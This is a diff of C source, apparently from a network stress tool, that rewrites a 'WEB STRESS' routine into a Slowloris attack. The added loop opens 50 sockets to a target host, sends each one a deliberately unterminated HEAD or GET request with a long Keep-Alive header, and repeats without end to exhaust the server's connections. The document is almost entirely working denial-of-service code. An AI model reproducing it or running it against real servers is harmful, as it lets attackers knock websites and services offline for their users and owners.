@@ -558,18 +558,45 @@ inline static void __slow_stress() {
    signal(SIGPIPE, SIG_IGN);
 
    register char *data = __http;
-   register uint16 size = strlen(__http);
+   register uint16 size;
 
    show("[Connected]\n");
    show("[WEB STRESS] Making SlowLoris HTTP Requests to host [%s] on port %d...\n",
    pkt->dst, pkt->port);
 
+   int socks[50], i;
+
    __WEB:
-      sock = socket(AF_INET, SOCK_STREAM, 0);
-      __set_keepalive(sock);
-      connect(sock, (struct sockaddr *) targ, tsize);
-      send(sock, data, size, 0);
-      usleep(100000);
+      for (i = 0; i < 50; i++) {
+
+         if ( (i % 2) == 0 ) {
+            snprintf(data, sizeof(__http) - 1,
+            "HEAD / HTTP/1.1\r\n"
+            "Host: %s\r\n"
+            "User-Agent: Nsoq Signature\r\n"
+            "Keep-Alive: 900\r\n", pkt->dst);
+         } else {
+            snprintf(data, sizeof(__http) - 1,
+            "GET / HTTP/1.1\r\n"
+            "Host: %s\r\n"
+            "User-Agent: Nsoq Signature\r\n"
+            "Keep-Alive: 900\r\n", pkt->dst);
+         }
+
+         size = strlen(data);
+
+         close(socks[i]);
+         if ( (socks[i] = socket(AF_INET, SOCK_STREAM, 0)) == -1 ) {
+            log("ERROR on socket create.\n");
+            break;
+         }
+
+         __set_keepalive(socks[i]);
+         connect(socks[i], (struct sockaddr *) targ, tsize);
+         send(socks[i], data, size, 0);
+      }
+
+      usleep(10000000);
    goto __WEB;
 
    pthread_exit(NULL);
